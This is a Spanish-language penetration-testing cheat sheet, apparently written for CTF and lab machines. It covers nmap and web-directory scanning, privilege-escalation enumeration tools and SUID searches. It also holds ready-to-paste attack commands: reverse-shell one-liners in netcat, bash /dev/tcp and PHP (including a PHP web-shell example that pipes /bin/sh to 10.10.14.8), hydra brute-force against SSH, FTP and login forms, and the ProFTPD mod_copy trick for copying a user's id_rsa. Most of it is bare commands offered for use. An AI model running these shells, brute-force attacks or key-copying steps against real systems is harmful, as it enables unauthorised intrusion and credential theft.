# Pentester Cheat Sheet CiberSecurity

### Host
**Actividad Del host**

```
ping -c 1 10.10.10.10
si TTL = 128 Windows / 64 Linux
```

**Nombre Host**
```
hostname
```

**Información Sistema Operativo**
```
uname -a
```

**Información Sistema Operativo + Adicionales**
```
cat /proc/versión
```
```
cat /etc/issue
```

### Reconocimiento
**Escaneo Puertos Normal**

```
nmap 10.10.10.10 -p- --open -T5 -v -n -oG PuertosOpen
```
**Escaneo Puertos Rapido**

```
nmap -sS --min-rate 5000 --open -vvv -n -Pn -p- 10.10.10.10 -oG PuertosOpen
```

**Escaneo Puertos UDP**
```
 nmap -sC -sV -sU --top-ports 100 10.10.10.10 -OG PuertosOpenUDP
```

**Escaneo Servicios**
```
nmap -sC -sV -p80,443,445 10.10.10.10 -oN VersionServices
```


### Enumeración Web
**Wfuzz**
```
wfuzz -c -L -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://ip-site/FUZZ
```
```
wfuzz -c -L -t 200 --hc=404 --hw=0 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://ip-site/FUZZ.extension
```
```
100 = Continuar
200 = OK
201 = Creado
202 = Aceptado
204 = Sin contenido
301 = Permanentemente re dirigido o movido.
302 = Temporalmente re dirigido o movido.
400 = Solicitud incorrecta.
401 = Requiere autorización.
403 = Prohibido.
404 = No se encuentra.
500 = Error crítico en el servidor.
```
**Gobuster**
```
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u http://ip-site
```

**Nmap Script**
```
nmap --script http-enum -p80 10.10.10.10 -oN EnumDirectory

```

**Wordpress**
```
wpscan --url http://10.10.10.10
```

**DNS**
```
dnsrecon -d google.com -n 10.10.10.10
```

**Lista Subdominios**
```
sublist3r -d target-host.com
```

### Reverse Shells
**Netcat**
```
nc -e /bin/sh 10.0.0.1 1233
```
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

**Bash**

```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

**PHP**

```
$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");
```

**Example**
```
<?php
system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f");
?>
```

### Servidores Web 
**Python3**
```
python3 -m http.server 8080
```
**Netcat**

```
nc -lvnp 8080
```

### Tratamiento TTY 
**TTY**
```
script /dev/null -c bash
```
```
ctrl + z
```
```
stty raw -echo; fg
```
```
reset
```
```
xterm
```
```
export TERM=xterm
```
```
export SHELL=bash
```
```
stty -a | aplicar en nueva ventana
```
```
stty rows <rows> columns <columns>
```


### Exploits DB
**Busqueda Exploit**
```
searchsploit apache
```

**Ver Exploit**

```
searchsploit -x NumberExploit
```

**Descargar Exploit**
```
searchsploit -m NumberExploit
```

### Analisis De Archivos
**Ver Tipo De Archivo**
```
file unknown.x
```

**Extraer Información**
```
strings file
```

**Buscar Información Oculta**
```
binwalk file.png
```

**Extraer Información Oculta**
```
binwalk -e file.png
```

### Encode / Decode
**Texto A Base64**
```
echo -n "text" | base64
```
**Base64 A Texto**
```
echo -n "dGV4dA==" | base64 -d
```

### Brute Force
**File SHA-256-CBC**
```
bruteforce-salted-openssl -t 50 -f /usr/share/wordlists/rockyou.txt -d sha256 file_encoded -1
```

**Hydra**
```
hydra -l <user> -P <dictionary> 10.10.10.10 http-post-form "/login:username=^USER^&password=^PASS^:F=Failed Message" -V | brutefoce formulay web
```

```
hydra -l <user> -P <dictionary> 10.10.10.10 ssh t4 | brutefoce ssh service
```

```
hydra -l <user> -P <dictionary> 10.10.10.10 ftp t4 | brutefoce sftp service
```

**BurpSuite**
```
- Proxy/Options   -> Allow (Dont send items to proxy history or live tasks, if but of scope)
- Target/Scope    -> Add (Site-Work)
- Proxy/Intercept -> On intercept
- Realizar Petición A Capturar
- Ctrl + i (Send Intruder)
- Clear S + Add S (S = Select)
- head -n 10000 /usr/share/wordlists/rockyou.txt > passwords (Create Diccionary)
- Payload Options Simple List/Load (Load dictionary)
- Disallow Option Payload Encoding
- Options/Refetch Response (Select expresion regular) 
- Start Sttack
```


### Certificados SSL
**Inspeccionar Certificado**
```
openssl s_client -connect 10.10.10.10:443
```


### Herramientas Pentest
**Pspy**
```
git clone https://github.com/DominicBreuker/pspy.git
```
```
go build main.go
```
```
chmod +x pspy
```
```
./pspy
```

**Chisel**
```
chmod +x
```
```
./chisel server --reverse-port 2000
```
```
./chisel client 10.10.10.10:2000 R:1000:127.0.0.1:80
```


### Herramientas De Enumeración SO Automatizadas
**LinPeas**
```
git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
```
**LinEnum**
```
git clone https://github.com/rebootuser/LinEnum
```
**LES**
```
git clone https://github.com/mzet-/linux-exploit-suggester
```
**Linux Smart Enumeration**
```
git clone https://github.com/diego-treitos/linux-smart-enumeration
```
**Linux Priv Checker**
```
git clone https://github.com/linted/linuxprivchecker
```
**Linux Exploit Suggester 2**
```
git clone https://github.com/jondonas/linux-exploit-suggester-2.git
```


### Utilidades Del Sistema
**Tar**
```
tar -zcvf resultado.tar.gz archivo-or-directory | Comprimir archivo
```
```
tar -xvzf archivo-or-directory.tar.gz | Descomprimir archivo
```
**Knock**
```
cat /etc/knockd.conf | Ver archivo de configuración
```
```
knock 10.10.10.10 port:protocol | Abrir puerto
```

**Tmux**
```
c | create window
```
```
w | list windows
```
```
n | next window
```
```
p | previous window
```
```
f | find window
```
```
, | name window
```
```
& | kill window
```

**Administrador De Tareas**
```
ps -faux
```

**Rutas De Red**
```
netstat -at | enumerar protocolos tcp
```
```
netstat -au | enumerar protocolos udp
```
```
netstat -l | lista de puertos en modo
```

**Capabilities**
```
getcap -r / 2</dev/null
```

**Crontab**
```
cat /etc/crontab
```

**Path**
```
export PATH=/tmp:$PATH
```
**Mount**
```
mount 10.10.10.10:/var /mnt/kenobiNFS | Montar unidad existente service rpc
```
```
umount -f -l /mnt/kenobiNFS | Desmontar unidad existente service rpc
```
**Generar Hash**
```
mkpasswd -m sha-512 newpasswordhere | Genera un hash de una contraseña dada para shadow
```
**Ver Historial CLI**
```
cat ~/.*history | less
```





### Filtrado Información
**Command cut**
```
cat /etc/passwd | cut -d ":" -f 1 | devuelve la primera linea 
```

**Command grep**
```
cat /etc/passwd | grep "home" | devuelve cualquier linea que contenga home
```

**Command find**
```
find . -name flag.txt | busca el archivo llamado "flag.txt" en el directorio actual
```
```
find /home -name flag1.txt | busca los nombres de archivo “flag.txt” en el directorio /home
```
```
find / -type d -name config | busca el directorio llamado config debajo de “/”
```
```
find / -type f -perm 0777 | busca archivos con los permisos 777 (archivos legibles, grabables y ejecutables por todos los usuarios)
```
```
find / -perm a=x | encontrar archivos ejecutables
```
```
find /home -user frank | encuentrar todos los archivos para el usuario "frank" en "/home"
```
```
find / -mtime 10 | encuentra archivos que fueron modificados en los últimos 10 días
```
```
find / -atime 10 | busca archivos a los que se accedió en los últimos 10 días
```
```
find / -size 50M | encuentra archivos con un tamaño de 50 MB
```
```
find / -perm -u=s -type f 2>/dev/null | Buscar archivos con el bit SUID
```
```
find / -type f -perm -04000 -ls 2>/dev/null | enumerará los archivos que tienen configurados los bits SUID o SGID.
```
```
find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u | búsqueda simple de carpetas de escritura
```

### Servicios

**Port: 21 (FTP)**
```
SITE CPFR /home/kenobi/.ssh/id_rsa | ver si existe un fichero existente > only version 1.3.5 File Copy
```
```
SITE CPTO /var/tmp/id_rsa | copiar archivo > only version 1.3.5 File Copy
```

**Port: 22 (SSH)**
```
ssh user@10.10.10.10
```
```
ssh -i id_rsa user@10.10.10.10 | connect whith id_rsa
```

**Port: 111 (RPC)**
```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.10.10 | enumerar rpc
```


**Port: 445 (Samba)**

```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.10 | nmap script reconocimiento
```
```
smbclient //10.10.10.10/anonymous | connect samba
```
```
get file.txt | download files samba
```

